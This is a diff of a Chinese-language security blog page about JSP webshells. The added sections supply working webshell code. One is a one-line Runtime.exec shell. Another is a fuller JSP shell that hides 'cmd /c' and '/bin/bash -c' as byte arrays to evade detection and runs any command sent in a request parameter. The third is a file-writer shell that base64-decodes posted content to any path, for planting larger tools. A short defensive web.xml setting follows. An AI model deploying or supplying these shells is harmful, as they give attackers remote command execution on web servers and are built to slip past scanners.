@@ -109,8 +109,9 @@
 <meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208111458239.png">
 <meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208163725862.png">
 <meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2020.png">
+<meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/E:%5Cblog%5Csource_posts%5Cjsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%5Cimage-20201210114440522.png">
 <meta property="article:published_time" content="2020-12-08T02:49:41.085Z">
-<meta property="article:modified_time" content="2020-12-09T06:41:16.228Z">
+<meta property="article:modified_time" content="2020-12-21T01:19:10.782Z">
 <meta property="article:author" content="Virusday">
 <meta property="article:tag" content="Learn">
 <meta name="twitter:card" content="summary">
@@ -337,8 +338,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-12-09T14:41:16+08:00">
-                2020-12-09
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-21T09:19:10+08:00">
+                2020-12-21
               </time>
             
           </span>
@@ -365,7 +366,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.8k
+                  2.5k
                 </span>
               
 
@@ -381,7 +382,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  8
+                  12
                 </span>
               
             </div>
@@ -471,7 +472,22 @@
 <p>​    因为利用的是动态二进制的加密 ，所以需要class文件的动态生成，不能每次都去编译。所以涉及到了java的asm框架。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为，也就是动态修改class文件中的属性值。</p>
 <p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2020.png" alt></p>
 <p>需要执行的命令是编码在class文件中的，因为class是已编译好的文件。但不能每次执行命令时都编译payload，那么就需要payload可以接收参数。为了参数被waf拦截，自然也是二进制流，所以作者使用ASM框架来动态修改class文件中的属性值。从上面的代码就可以看出，只需要向getParamedClass方法传递payload类名、参数列表即可获得经过参数化的payload class。</p>
-<h2 id="0x05-安全防范"><a href="#0x05-安全防范" class="headerlink" title="0x05 安全防范"></a>0x05 安全防范</h2><p>前提条件是：你的 Java Web 应用没有在 Jsp 中直接使用任何 Java 代码，否则会对应用本身造成影响。</p>
+<h2 id="0x05-用ProcessBuilder绕过检测"><a href="#0x05-用ProcessBuilder绕过检测" class="headerlink" title="0x05 用ProcessBuilder绕过检测"></a>0x05 用ProcessBuilder绕过检测</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>));%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Runtime, exec 字眼太过刺眼。所以可以使用ProcessBuilder类创建。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By V1rus&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"POST"</span> NAME=<span class="string">"form"</span> ACTION=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"F*ck"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">"Got Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);<span class="comment">//cmd /c  windows系统</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query); <span class="comment">// /bin/bash   linux系统</span></span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(process.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x06-二进制文件上传技巧"><a href="#0x06-二进制文件上传技巧" class="headerlink" title="0x06 二进制文件上传技巧"></a>0x06 二进制文件上传技巧</h2><p>​    当我们有新建文本文件权限，但被限制上传、不能远程下载文件时，可以试试将二进制字符串编码（具体涉及的可以有很多种，这里采用base64的方式）：</p>
+<p>1、 base64命令</p>
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/E:%5Cblog%5Csource_posts%5Cjsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%5Cimage-20201210114440522.png" alt="image-20201210114440522"></p>
+<p>这里一定要加上-i参数 该参数用于忽略非字母表字符，比如换行符。因为在POST提交过程中貌似要被添加上换行符。 如果转出来的exe不能使用最好试试这个-i选项。</p>
+<p>2、 上传解码base写入文件的shell</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> pageEncoding=<span class="string">"UTF-8"</span> contentType=<span class="string">"text/html; charset=utf-8"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        String filePath = request.getParameter(<span class="string">"filePath"</span>);</span><br><span class="line">        String content = request.getParameter(<span class="string">"content"</span>);</span><br><span class="line">        String base64Flag = request.getParameter(<span class="string">"base64"</span>);</span><br><span class="line">        String msg = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(content != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        File file = <span class="keyword">new</span> File(filePath);</span><br><span class="line">                        OutputStream os = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                        <span class="keyword">byte</span>[] bytes = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="string">"on"</span>.equals(base64Flag))&#123;</span><br><span class="line">                                bytes = <span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(content);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                bytes = content.getBytes(<span class="string">"utf-8"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        os.write(bytes);</span><br><span class="line">                        os.close();</span><br><span class="line">                        msg = <span class="string">"success"</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                        msg = <span class="string">"error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                &lt;font color="red"&gt;&lt;%=msg%&gt;&lt;/font&gt;</span><br><span class="line">                &lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                        &lt;table&gt;</span><br><span class="line">                                &lt;tr&gt;</span><br><span class="line">                                        &lt;td&gt;本文件路径：&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;%=application.getRealPath("")%&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr&gt;</span><br><span class="line">                                        &lt;td&gt;保存路径：&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;input type="text" size="60" name="filePath"/&gt;&lt;input type="checkbox" name="base64"/&gt;base64解码保存&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr valign=<span class="string">"top"</span>&gt;</span><br><span class="line">                                        &lt;td&gt;大马内容:&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;textarea rows="20" cols="70" name="content"&gt;&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr align=<span class="string">"right"</span>&gt;</span><br><span class="line">                                        &lt;td&gt; &lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;input type="submit" value="保存"/&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                        &lt;/table&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用post提交数据，base64Flag为on</p>
+<h2 id="0x06-安全防范"><a href="#0x06-安全防范" class="headerlink" title="0x06 安全防范"></a>0x06 安全防范</h2><p>前提条件是：你的 Java Web 应用没有在 Jsp 中直接使用任何 Java 代码，否则会对应用本身造成影响。</p>
 <p>方法：</p>
 <p>在 web.xml 文件中加下以下配置：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">&lt;/jsp-config&gt;</span><br></pre></td></tr></table></figure>
@@ -486,6 +502,7 @@
 </ol>
 <p><a href="https://zgao.top/" target="_blank" rel="noopener">https://zgao.top/</a></p>
 <p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>
+<p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/using-java-reflection-and-ClassLoader-bypass-webshell-detection/using-java-reflection-and-ClassLoader-bypass-webshell-detection.md" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/using-java-reflection-and-ClassLoader-bypass-webshell-detection/using-java-reflection-and-ClassLoader-bypass-webshell-detection.md</a></p>
 
       
     </div>
@@ -519,6 +536,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/22/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/" rel="prev" title="ssrf挖掘技巧/ssrf挖掘技巧">
+                ssrf挖掘技巧/ssrf挖掘技巧 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -599,7 +620,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">47</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -643,23 +664,23 @@
                 
                 
                   <li class="recent_posts_li">
+                    <a href="/2020/12/24/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/1/" title="面试问题整理/1" target="_blank">面试问题整理/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/24/%E6%8F%90%E6%9D%83/%E8%84%8F%E7%89%9BLinux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/%E8%84%8F%E7%89%9BLinux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" title="提权/脏牛Linux本地提权/脏牛Linux本地提权" target="_blank">提权/脏牛Linux本地提权/脏牛Linux本地提权</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/22/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/" title="ssrf挖掘技巧/ssrf挖掘技巧" target="_blank">ssrf挖掘技巧/ssrf挖掘技巧</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
                     <a href="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="jsp一句话木马/jsp一句话木马" target="_blank">jsp一句话木马/jsp一句话木马</a>
                   </li>
                 
                   <li class="recent_posts_li">
                     <a href="/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/" title="waf bypass/waf bypass技巧" target="_blank">waf bypass/waf bypass技巧</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/" title="XSS绕过总结/XSS深入" target="_blank">XSS绕过总结/XSS深入</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2020/12/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集/信息收集" target="_blank">信息收集/信息收集</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/" title="JAVA JNDI注入/JAVA JNDI注入" target="_blank">JAVA JNDI注入/JAVA JNDI注入</a>
                   </li>
                 
               </ul>
@@ -687,7 +708,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02"><span class="nav-number">2.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一：-执行系统命令"><span class="nav-number">2.1.</span> <span class="nav-text">一： 执行系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、把字符串编码后写入指定文件的："><span class="nav-number">2.2.</span> <span class="nav-text">二、把字符串编码后写入指定文件的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、-反射调用外部jar包"><span class="nav-number">2.3.</span> <span class="nav-text">四、 反射调用外部jar包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-免杀！"><span class="nav-number">3.</span> <span class="nav-text">0x03 免杀！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#类加载"><span class="nav-number">3.1.</span> <span class="nav-text">类加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过d盾"><span class="nav-number">3.2.</span> <span class="nav-text">过d盾</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP标签"><span class="nav-number">3.2.1.</span> <span class="nav-text">JSP标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-冰蝎分析"><span class="nav-number">4.</span> <span class="nav-text">0x04 冰蝎分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-安全防范"><span class="nav-number">5.</span> <span class="nav-text">0x05 安全防范</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02"><span class="nav-number">2.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一：-执行系统命令"><span class="nav-number">2.1.</span> <span class="nav-text">一： 执行系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、把字符串编码后写入指定文件的："><span class="nav-number">2.2.</span> <span class="nav-text">二、把字符串编码后写入指定文件的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、-反射调用外部jar包"><span class="nav-number">2.3.</span> <span class="nav-text">四、 反射调用外部jar包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-免杀！"><span class="nav-number">3.</span> <span class="nav-text">0x03 免杀！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#类加载"><span class="nav-number">3.1.</span> <span class="nav-text">类加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过d盾"><span class="nav-number">3.2.</span> <span class="nav-text">过d盾</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP标签"><span class="nav-number">3.2.1.</span> <span class="nav-text">JSP标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-冰蝎分析"><span class="nav-number">4.</span> <span class="nav-text">0x04 冰蝎分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-用ProcessBuilder绕过检测"><span class="nav-number">5.</span> <span class="nav-text">0x05 用ProcessBuilder绕过检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-二进制文件上传技巧"><span class="nav-number">6.</span> <span class="nav-text">0x06 二进制文件上传技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-安全防范"><span class="nav-number">7.</span> <span class="nav-text">0x06 安全防范</span></a></li></ol></div>
             
 
           </div>
@@ -729,7 +750,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">50k</span>
+    <span title="Site words total count">54.5k</span>
   
 </div>
 -->
